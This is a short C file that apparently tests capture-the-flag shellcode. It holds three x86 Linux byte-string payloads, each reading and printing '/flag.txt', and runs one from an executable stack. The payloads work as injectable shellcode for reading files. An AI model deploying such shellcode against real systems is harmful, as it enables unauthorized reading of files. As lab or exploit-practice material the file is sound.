/* shellcode goes here : */
char code2[] = "\x31\xc0\x50\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x50\x68\x74\x00\x00\x00\x68\x67\x2e\x74\x78\x68\x2f\x66\x6c\x61\x89\xe1\x50\x51\x53\x89\xe1\x31\xc0\x83\xc0\x0b\xcd\x80";
char code3[] = "\xb8\x05\x00\x00\x00\xbb\x00\xa0\x04\x08\x31\xc9\xcd\x80\x89\xc3\xb8\x03\x00\x00\x00\x83\xec\x64\x89\xe1\xba\x64\x00\x00\x00\xcd\x80\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00\x89\xe1\xcd\x80\xb8\x01\x00\x00\x00\x31\xdb\xcd\x80";
char code[] = "\x6a\x74\x68\x67\x2e\x74\x78\x68\x2f\x66\x6c\x61\x89\xe3\x31\xc9\x6a\x05\x58\xcd\x80\x6a\x01\x5b\x89\xc1\x31\xd2\x68\xff\xff\xff\x7f\x5e\x31\xc0\xb0\xbb\xcd\x80";

int main()
{
    (*(void(*)()) code)();
    return 0;
}

/* gcc -o shellcode shellcode.c -z execstack -m32 */ 